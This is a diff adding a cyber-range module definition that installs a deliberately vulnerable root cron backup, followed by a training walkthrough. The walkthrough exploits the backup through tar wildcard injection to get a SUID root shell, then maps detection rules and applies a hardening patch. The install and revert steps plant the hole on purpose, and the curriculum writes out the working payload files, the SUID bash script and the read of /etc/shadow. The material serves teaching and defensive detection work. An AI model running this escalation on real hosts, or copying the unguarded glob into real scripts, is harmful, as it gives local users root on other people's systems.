@@ -1,0 +1,508 @@
+# Bolt-on: tar Wildcard Injection in Daily Cron
+# ---------------------------------------------
+# Install drops /etc/cron.daily/bolton-backup that does:
+#   cd /tmp/bolton-data && tar czf /backup/bk.tgz *
+# Shell wildcard expansion includes filenames starting with `-`, so any
+# local user who can write to /tmp/bolton-data can drop files named
+# `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`. cron runs
+# tar as root; tar interprets those as arguments and runs sh shell.sh
+# as root — wildcard injection privilege escalation (T1059).
+#
+# Patch rewrites the script with `tar czf ... -- *` (POSIX `--` end-of-
+# options sentinel) and seeds /etc/cron.daily/bolton-shellcheck-ci that
+# greps cron.daily scripts for unguarded glob arguments.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/linux/privilege_escalation_potential_wildcard_shell_spawn.toml
+#   Research/elastic-detection-rules/rules/linux/persistence_cron_job_creation.toml
+
+id: bolton.privilege-escalation.wildcard-injection-tar
+slug: wildcard-injection-tar
+name: "tar Wildcard Injection in Daily Cron Backup"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: privilege-escalation
+subcategory: wildcard-injection
+tags:
+  - wildcard-injection
+  - tar
+  - cron
+  - privilege-escalation
+  - linux
+description: >
+  Installs /etc/cron.daily/bolton-backup that runs
+  `cd /tmp/bolton-data && tar czf /backup/bk.tgz *` as root every day.
+  Unguarded shell globbing means filenames starting with `-` are
+  passed to tar as options. A local user who can write to the source
+  directory drops `--checkpoint=1` and
+  `--checkpoint-action=exec=sh shell.sh` files plus a payload `shell.sh`
+  — tar then runs `sh shell.sh` as root on the next daily tick (MITRE
+  T1059).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1059/"
+  - "https://www.gnu.org/software/tar/manual/html_section/Checkpoints.html"
+  - "https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt"
+
+mitre:
+  tactic:
+    id: TA0004
+    name: "Privilege Escalation"
+  technique:
+    id: T1059
+    name: "Command and Scripting Interpreter"
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "0b803267-74c5-444d-ae29-32b5db2d562a"
+      rule_name: "Potential Shell via Wildcard Injection Detected"
+      rule_filename: "linux/privilege_escalation_potential_wildcard_shell_spawn.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Fires when tar spawns sh via --checkpoint-action=exec, the exact post-exploit primitive."
+    - rule_uuid: "ff10d4d8-fea7-422d-afb1-e5a2702369a9"
+      rule_name: "Cron Job Created or Modified"
+      rule_filename: "linux/persistence_cron_job_creation.toml"
+      coverage: partial
+      confidence: medium
+      last_validated: 2026-05-23
+      notes: "Fires at install on the cron.daily script creation."
+  signal_sources:
+    - "Auditd FILE_CREATE on /etc/cron.daily/bolton-backup"
+    - "Auditd execve of /bin/tar with --checkpoint-action in argv"
+    - "Auditd execve of /bin/sh with parent=tar and euid=0"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services:
+    - cron
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Ensure the source directory exists (world-writable)."
+      role_vars:
+        path: "/tmp/bolton-data"
+        state: directory
+        owner: root
+        group: root
+        mode: "0777"
+    - ansible_role: ansible.builtin.file
+      description: "Ensure the backup destination exists."
+      role_vars:
+        path: "/backup"
+        state: directory
+        owner: root
+        group: root
+        mode: "0755"
+    - ansible_role: ansible.builtin.copy
+      description: "Drop the cron.daily backup script with unguarded glob."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-backup"
+        content: |
+          #!/bin/sh
+          # bolton-backup — daily root cron, wildcard-injectable.
+          cd /tmp/bolton-data && tar czf /backup/bk.tgz *
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      test -x /etc/cron.daily/bolton-backup && grep -q "tar czf.*\*" /etc/cron.daily/bolton-backup
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the vulnerable backup script."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove cron.daily script."
+      role_vars:
+        path: "/etc/cron.daily/bolton-backup"
+        state: absent
+  verify:
+    probe: |
+      test ! -e /etc/cron.daily/bolton-backup
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Rewrite the cron script with `tar czf ... -- *` (the POSIX `--`
+    end-of-options sentinel makes tar treat all subsequent args as file
+    operands, not flags). Also drop /etc/cron.daily/bolton-shellcheck-ci
+    that scans every script under /etc/cron.{daily,hourly,weekly} with
+    shellcheck (installed by the patch) for SC2035 (use ./ instead of
+    bare glob) and syslog-warns on any hit.
+  patch_reference:
+    - "https://www.shellcheck.net/wiki/SC2035"
+    - "https://attack.mitre.org/mitigations/M1038/"
+  complexity: low
+  side_effects:
+    - "shellcheck package installed (~5 MB)"
+    - "Daily CI run at ~06:25 reports unguarded glob args in cron scripts"
+    - "Syslog entries tagged 'bolton-shellcheck-ci' on SC2035 / SC2086 hits"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.copy
+      description: "Rewrite backup script with end-of-options sentinel and explicit ./* (no leading-dash filenames passed as options)."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-backup"
+        content: |
+          #!/bin/sh
+          # bolton-backup — hardened against wildcard injection
+          set -eu
+          cd /tmp/bolton-data && tar czf /backup/bk.tgz -- ./*
+        owner: root
+        group: root
+        mode: "0755"
+    - ansible_role: ansible.builtin.package
+      description: "Install shellcheck for the CI pass."
+      role_vars:
+        name: shellcheck
+        state: present
+    - ansible_role: ansible.builtin.copy
+      description: "Daily shellcheck CI on cron scripts."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-shellcheck-ci"
+        content: |
+          #!/bin/sh
+          # bolton-shellcheck-ci — warn on SC2035 (unguarded glob) in cron scripts
+          for d in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly; do
+            [ -d "$d" ] || continue
+            for f in "$d"/*; do
+              [ -f "$f" ] || continue
+              # Skip self.
+              case "$f" in *bolton-shellcheck-ci) continue ;; esac
+              /usr/bin/shellcheck -s sh -S warning "$f" 2>&1 | grep -E "SC2035|SC2086" | while read line; do
+                logger -t bolton-shellcheck-ci "$f: $line"
+              done
+            done
+          done
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      grep -q "tar czf.*-- \./\*" /etc/cron.daily/bolton-backup && test -x /etc/cron.daily/bolton-shellcheck-ci
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/wildcard_tar_check.sh"
+
+patch_revert:
+  description: "Restore the unguarded glob script and remove the shellcheck CI — wildcard injection works again."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove shellcheck CI."
+      role_vars:
+        path: "/etc/cron.daily/bolton-shellcheck-ci"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Restore unguarded glob script."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-backup"
+        content: |
+          #!/bin/sh
+          cd /tmp/bolton-data && tar czf /backup/bk.tgz *
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      test -x /etc/cron.daily/bolton-backup && grep -q "tar czf.*\*" /etc/cron.daily/bolton-backup && ! grep -q -- "-- \./\*" /etc/cron.daily/bolton-backup
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Wildcard injection works again: drop --checkpoint-action=exec=sh shell.sh in /tmp/bolton-data and wait for the next daily tick."
+
+cost:
+  storage_mb: 5
+  cpu_pct: 1
+  detectability: quiet
+
+curriculum:
+  title: "tar Wildcard Injection — Root via a Daily Cron Backup"
+  summary: >
+    Walkthrough of the classic Unix wildcard-injection privilege
+    escalation against a root-owned daily cron backup on tllinux01
+    (10.99.50.13). You discover the writable source dir, plant the
+    --checkpoint-action option-files plus a payload script, wait for
+    cron to expand the glob, and pop a root shell. Final step covers
+    the `tar -- ./*` end-of-options sentinel and shellcheck CI.
+  learning_objectives:
+    - "Explain why shell glob expansion treats leading-dash filenames as option arguments."
+    - "Identify a cron job vulnerable to wildcard injection by reading /etc/cron.daily scripts."
+    - "Craft the canonical tar --checkpoint-action=exec payload."
+    - "Map the technique to Elastic's wildcard-shell-spawn rule."
+    - "Apply the POSIX `--` end-of-options fix + deploy a shellcheck CI cron."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser via the bastion"
+    - "Patience: cron.daily fires at ~06:25 by default (or trigger manually with sudo run-parts)"
+  estimated_total_minutes: 30
+  steps:
+    - id: "01-find-cron"
+      title: "Discover the vulnerable cron script"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Find a root-owned cron job that globs
+
+        ```bash
+        # On tllinux01 as appuser
+        ls -la /etc/cron.*
+        cat /etc/crontab
+        cat /etc/cron.daily/*    # read-permission only, can't modify
+        ```
+
+        Spot the bolt-on:
+
+        ```bash
+        cat /etc/cron.daily/bolton-backup
+        # #!/bin/sh
+        # cd /tmp/bolton-data && tar czf /backup/bk.tgz *
+        ```
+
+        `tar czf /backup/bk.tgz *` is the smoking gun — unguarded
+        `*` expansion. Check the source dir:
+
+        ```bash
+        ls -ld /tmp/bolton-data
+        # drwxrwxrwx 2 root root 4096 ... /tmp/bolton-data   ← world-writable
+        ```
+
+        linpeas auto-flags `/etc/cron.*` scripts that contain bare
+        globs:
+
+        ```bash
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A3 "Cron"
+        ```
+
+        **Detection callout:** the install side is caught by **Cron
+        Job Created or Modified** (`ff10d4d8-fea7-422d-afb1-e5a2702369a9`).
+        Recon (reading /etc/cron.d) is not caught by default.
+    - id: "02-plant-payload"
+      title: "Plant the option-files + payload"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 2 — Drop the wildcard-injection payload
+
+        The trick: bash globs expand `*` to include EVERY filename in
+        the directory, including ones beginning with `-`. tar interprets
+        anything starting with `-` as an option, not a filename. We drop
+        files that look like tar options:
+
+        ```bash
+        # On tllinux01 as appuser
+        cd /tmp/bolton-data
+
+        # 1. The payload script — runs as root when cron fires
+        cat > shell.sh << 'EOF'
+        #!/bin/sh
+        # Copy bash to /tmp/.rootsh with SUID root
+        cp /bin/bash /tmp/.rootsh
+        chmod 4755 /tmp/.rootsh
+        EOF
+        chmod +x shell.sh
+
+        # 2. The option-files — tar reads these as flags
+        touch -- "--checkpoint=1"
+        touch -- "--checkpoint-action=exec=sh shell.sh"
+
+        ls -la
+        # -rwxr-xr-x 1 appuser appuser  77 ... shell.sh
+        # -rw-r--r-- 1 appuser appuser   0 ... --checkpoint=1
+        # -rw-r--r-- 1 appuser appuser   0 ... --checkpoint-action=exec=sh shell.sh
+        ```
+
+        When cron fires, the shell expands `*` to:
+
+        ```
+        tar czf /backup/bk.tgz --checkpoint-action=exec=sh\ shell.sh --checkpoint=1 shell.sh
+        ```
+
+        tar honours `--checkpoint=1` (emit a progress message every
+        record) and `--checkpoint-action=exec=sh shell.sh` (on each
+        checkpoint, run the given command). The command runs as root
+        because cron runs the script as root.
+
+        > **Why two files, not one?** `--checkpoint-action` only fires
+        > when there's at least one checkpoint, and checkpoints only
+        > happen if you've also set `--checkpoint=N`. Dropping both
+        > files is the canonical recipe.
+
+        **Detection callout:** auditd FILE_CREATE on `/tmp/bolton-data/*`
+        with leading-dash filenames by non-root uid is the highest
+        fidelity install signal. Most SIEMs don't have a default rule
+        for this — write one: `path ~ "^/tmp/.*/-"`.
+    - id: "03-trigger-wait"
+      title: "Trigger cron + collect root shell"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — Wait for the daily tick (or force it)
+
+        Default cron.daily runs at ~06:25. Force it manually if you
+        have sudo on a different user, or just wait:
+
+        ```bash
+        # If you have sudo on a separate account for testing:
+        sudo run-parts --report /etc/cron.daily
+
+        # Otherwise, wait for the next 06:25 tick. Check the next run time:
+        systemctl list-timers --all | grep cron
+        ```
+
+        After cron fires, the SUID bash sits ready:
+
+        ```bash
+        # On tllinux01 as appuser, after cron has run
+        ls -la /tmp/.rootsh
+        # -rwsr-xr-x 1 root root 1265688 ... /tmp/.rootsh
+
+        /tmp/.rootsh -p
+        bash-5.1# id
+        uid=1001(appuser) gid=1001(appuser) euid=0(root) groups=1001(appuser)
+        bash-5.1# cat /etc/shadow
+        ```
+
+        **Detection callout:** **Potential Shell via Wildcard Injection
+        Detected** (`0b803267-74c5-444d-ae29-32b5db2d562a`) fires the
+        moment tar spawns sh via --checkpoint-action — HIGH confidence,
+        no benign analog.
+      assessment:
+        question: "Why does the attacker create empty option-files rather than putting flags directly in the cron script?"
+        options:
+          - "Empty files are smaller and easier to hide"
+          - "The attacker can't edit /etc/cron.daily/bolton-backup; only the source-dir wildcard expansion is attacker-controlled"
+          - "tar refuses to parse flags from the command line"
+          - "cron strips command-line arguments before execution"
+        correct_index: 1
+        explanation: >
+          The attacker is `appuser` and cannot write to
+          /etc/cron.daily/* (those are 0644 root:root). The ONLY
+          attacker-controlled input to the cron job is the contents of
+          the world-writable source directory. Because the script uses
+          a bare `*`, anything in that dir becomes a command-line
+          argument to tar — including filenames that look like tar
+          flags. That's the entire essence of wildcard injection.
+    - id: "04-detection-mapping"
+      title: "Detection coverage on the blue side"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 4 — What the SOC sees
+
+        | Stage | Signal | Confidence |
+        |---|---|---|
+        | Install (cron drop) | FILE_CREATE on /etc/cron.daily/bolton-backup | High |
+        | Plant (leading-dash files) | FILE_CREATE on /tmp/*/-* by uid != 0 | Low (custom rule needed) |
+        | Trigger | execve of /bin/tar with --checkpoint-action in argv | High |
+        | Trigger | execve of /bin/sh with parent=tar and euid=0 | High |
+        | Post-exploit | FILE_CREATE on /tmp/.rootsh with mode 04755 | High |
+
+        The Elastic rule for wildcard injection keys on the
+        `--checkpoint-action=` substring in the tar command line —
+        that's effectively a fingerprint with zero legitimate use.
+        Variants (e.g. rsync wildcard injection via `-e`, chown with
+        `--reference`) need their own per-tool detections.
+
+        **Detection callout:** auditd rule
+        `-a always,exit -F arch=b64 -S execve -F exe=/bin/tar -k tar_exec`
+        captures every tar invocation including the args. Correlate
+        with `argv contains "--checkpoint-action="` for the
+        canonical signature.
+    - id: "05-patch-mitigate"
+      title: "Blue-team: end-of-options sentinel + shellcheck CI"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Rewrites `/etc/cron.daily/bolton-backup` to use
+           `tar czf /backup/bk.tgz -- ./*` — the `--` POSIX
+           end-of-options sentinel makes tar treat ALL subsequent args
+           as file operands, never as flags. `./*` further guards
+           against unusual filenames because the `./` prefix means
+           even `-checkpoint=1` becomes `./-checkpoint=1` which tar
+           opens as a literal path.
+        2. Installs `shellcheck`.
+        3. Drops `/etc/cron.daily/bolton-shellcheck-ci` that scans
+           every /etc/cron.{daily,hourly,weekly}/* with shellcheck and
+           syslog-warns on `SC2035` (unguarded glob) and `SC2086`
+           (unquoted variable).
+
+        Re-run the attack — the payload files are still on disk:
+
+        ```bash
+        ls /tmp/bolton-data
+        # --checkpoint-action=exec=sh shell.sh
+        # --checkpoint=1
+        # shell.sh
+
+        # Force cron to fire
+        sudo run-parts --report /etc/cron.daily
+
+        # No /tmp/.rootsh appears
+        ls /tmp/.rootsh
+        # ls: cannot access '/tmp/.rootsh': No such file or directory
+        ```
+
+        Exploit dead. Verify the shellcheck CI:
+
+        ```bash
+        sudo /etc/cron.daily/bolton-shellcheck-ci
+        # (silent — no SC2035 hits)
+        ```
+
+        Defence-in-depth recommendations:
+
+        - **Always** use `-- ./*` (POSIX sentinel + relative-path
+          prefix) for any glob argument passed to a command that
+          interprets leading-dash options.
+        - Validate every script under /etc/cron.* with shellcheck in
+          CI before deployment — SC2035 is the rule that catches this.
+        - Drop scripts in /etc/cron.* to mode 0700 if they don't need
+          to be world-readable; doesn't fix the injection but cuts
+          the recon surface.
+
+        > **Rollback:** `patch_revert` restores the unguarded-glob
+        > script and removes the shellcheck CI.
+      assessment:
+        question: "Why does adding `--` to `tar czf X.tgz -- ./*` defeat wildcard injection?"
+        options:
+          - "It tells tar to abort on any unusual filename"
+          - "It marks the end of options — every subsequent arg is treated as a file operand even if it starts with -"
+          - "It strips leading dashes from all filenames before passing them to tar"
+          - "It runs tar in a sandbox with reduced privileges"
+        correct_index: 1
+        explanation: >
+          POSIX `--` is the end-of-options sentinel honoured by
+          virtually every GNU userland tool. After `--`, tar disables
+          flag parsing entirely — `--checkpoint-action=exec=sh ...`
+          becomes a literal filename that tar attempts to open and
+          fails on (or successfully archives, depending on whether it
+          exists). The `./` prefix on the glob is belt-and-suspenders:
+          even without `--`, tar wouldn't recognise `./-checkpoint=1`
+          as a flag because it doesn't start with a dash.
+
+status: stable
